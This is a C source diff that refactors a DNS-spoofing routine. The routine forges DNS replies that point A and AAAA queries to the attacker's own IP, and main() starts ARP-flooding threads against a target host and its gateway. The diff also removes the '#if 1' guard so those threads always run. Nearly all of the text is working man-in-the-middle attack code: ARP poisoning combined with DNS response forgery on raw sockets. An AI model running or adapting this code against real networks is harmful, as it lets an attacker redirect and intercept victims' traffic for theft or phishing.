@@ -343,12 +343,33 @@ void spoof_dns(int sock) {
     unsigned char* recv_data = (recv_buffer + sizeof(struct ether_header) + sizeof(struct iphdr)
             + sizeof(struct udphdr));
 
-    //Initial constant packet settings
     //Zero buffer for defaults
-    memset(buffer, 0xff, 65535);
+    memset(buffer, 0x00, 65535);
 
+    //Initial constant packet settings
+
+    //Ethernet
     eh->ether_type = htons(ETH_P_IP);
     memcpy(eh->ether_shost, gateway_mac, ETHER_ADDR_LEN);
+
+    //IP
+    ih->version = 4;
+    ih->ihl = 5;
+    ih->protocol = IPPROTO_UDP;
+    ih->tos = 0;
+    ih->frag_off = htons(0x4000);
+
+    //DNS data
+    //Set response flags to 0x8180
+    data[2] = 0x81;
+    data[3] = 0x80;
+
+    //1 answer RR
+    data[6] = 0x00;
+    data[7] = 0x01;
+
+    //Zero authority or additional RR
+    memset(data + 8, 0, 4);
 
     int size;
     int data_len = 60;
@@ -361,15 +382,10 @@ void spoof_dns(int sock) {
         memcpy(eh->ether_dhost, recv_eh->ether_shost, ETHER_ADDR_LEN);
 
         //IP stuffs
-        ih->version = 4;
-        ih->ihl = 5;
-        ih->protocol = IPPROTO_UDP;
         ih->saddr = recv_ih->daddr;
         ih->daddr = recv_ih->saddr;
         ih->id = htons(ntohs(recv_ih->id) + 1);
         ih->ttl = recv_ih->ttl;
-        ih->tos = 0;
-        ih->frag_off = htons(0x4000);
 
         //UDP stuffs
         uh->source = recv_uh->dest;
@@ -378,20 +394,8 @@ void spoof_dns(int sock) {
         //DNS stuffs
         //Transaction ID
         memcpy(data, recv_data, 2);
-        //Set response flags to 0x8580
-        //data[2] = 0x85;
-        data[2] = 0x81;
-        data[3] = 0x80;
-
         //Copy number of questions
         memcpy(data + 4, recv_data + 4, 2);
-
-        //1 answer RR
-        data[6] = 0x00;
-        data[7] = 0x01;
-
-        //Zero authority or additional RR
-        memset(data + 8, 0, 4);
 
         //Time to parse question string
         int name_len = 0;
@@ -407,35 +411,37 @@ void spoof_dns(int sock) {
 
         //NULL terminate name
         data[12 + name_len + 0] = 0x00;
+        data[12 + name_len + 1] = 0x00;
+        //IN address
+        data[12 + name_len + 3] = 0x00;
+        data[12 + name_len + 4] = 0x01;
+
+        //Compress name via pointer to question name string
+        data[12 + name_len + 5] = 0xc0;
+        //12 bytes offset
+        data[12 + name_len + 6] = 0x0c;
+
+        data[12 + name_len + 7] = 0x00;
+        //IN address
+        data[12 + name_len + 9] = 0x00;
+        data[12 + name_len + 10] = 0x01;
+
+        //TTL = 7200
+        data[12 + name_len + 11] = 0x00;
+        data[12 + name_len + 12] = 0x00;
+        data[12 + name_len + 13] = 0x1c;
+        data[12 + name_len + 14] = 0x20;
+        data[12 + name_len + 15] = 0x00;
 
         if (recv_data[12 + name_len + 2] == 0x1c) {
-            printf("AAAA record\n");
             //AAAA request
             //AAAA record, IN address
-            data[12 + name_len + 1] = 0x00;
             data[12 + name_len + 2] = 0x1c;
-            data[12 + name_len + 3] = 0x00;
-            data[12 + name_len + 4] = 0x01;
-
-            //Compress name via pointer to question name string
-            data[12 + name_len + 5] = 0xc0;
-            //12 bytes offset
-            data[12 + name_len + 6] = 0x0c;
 
             //Type A, IN address
-            data[12 + name_len + 7] = 0x00;
             data[12 + name_len + 8] = 0x1c;
-            data[12 + name_len + 9] = 0x00;
-            data[12 + name_len + 10] = 0x01;
-
-            //TTL = 7200
-            data[12 + name_len + 11] = 0x00;
-            data[12 + name_len + 12] = 0x00;
-            data[12 + name_len + 13] = 0x1c;
-            data[12 + name_len + 14] = 0x20;
 
             //Data length = 16
-            data[12 + name_len + 15] = 0x00;
             data[12 + name_len + 16] = 0x10;
 
             //Set ipv6 address
@@ -446,30 +452,12 @@ void spoof_dns(int sock) {
         } else {
             //A request
             //A record, IN address
-            data[12 + name_len + 1] = 0x00;
             data[12 + name_len + 2] = 0x01;
-            data[12 + name_len + 3] = 0x00;
-            data[12 + name_len + 4] = 0x01;
-
-            //Compress name via pointer to question name string
-            data[12 + name_len + 5] = 0xc0;
-            //12 bytes offset
-            data[12 + name_len + 6] = 0x0c;
 
             //Type A, IN address
-            data[12 + name_len + 7] = 0x00;
             data[12 + name_len + 8] = 0x01;
-            data[12 + name_len + 9] = 0x00;
-            data[12 + name_len + 10] = 0x01;
-
-            //TTL = 7200
-            data[12 + name_len + 11] = 0x00;
-            data[12 + name_len + 12] = 0x00;
-            data[12 + name_len + 13] = 0x1c;
-            data[12 + name_len + 14] = 0x20;
 
             //Data length = 4
-            data[12 + name_len + 15] = 0x00;
             data[12 + name_len + 16] = 0x04;
 
             memcpy(data + 12 + name_len + 17, &local_ip, 4);
@@ -488,7 +476,7 @@ void spoof_dns(int sock) {
 
         //Calculate UDP checksum
         uh->check = 0;
-        uh->check = check_udp_sum((unsigned char *) ih, ntohs(uh->len));
+        uh->check = check_udp_sum((unsigned char*) ih, ntohs(uh->len));
 
         struct sockaddr_ll addr = {0};
         addr.sll_family = AF_PACKET;
@@ -539,6 +527,7 @@ int main(void) {
     }
     printf("%02x %02x %02x %02x %02x %02x\n", gateway_mac[0], gateway_mac[1], gateway_mac[2],
             gateway_mac[3], gateway_mac[4], gateway_mac[5]);
+
     if (get_mac_from_ip(pack_sock, TARGET_IP, target_mac)) {
         perror("Initial gateway mac read");
         exit(EXIT_FAILURE);
@@ -546,7 +535,6 @@ int main(void) {
     printf("%02x %02x %02x %02x %02x %02x\n", target_mac[0], target_mac[1], target_mac[2],
             target_mac[3], target_mac[4], target_mac[5]);
 
-#if 1
     struct thread_arg ta;
     ta.sock = pack_sock;
     ta.victim_mac = gateway_mac;
@@ -563,7 +551,6 @@ int main(void) {
     tb.victim_ip = target_ip;
 
     pthread_create(&two, NULL, &flood_arp, &tb);
-#endif
 
     if (setsockopt(pack_sock, SOL_SOCKET, SO_ATTACH_FILTER, &port_filter, sizeof(port_filter))
             < 0) {
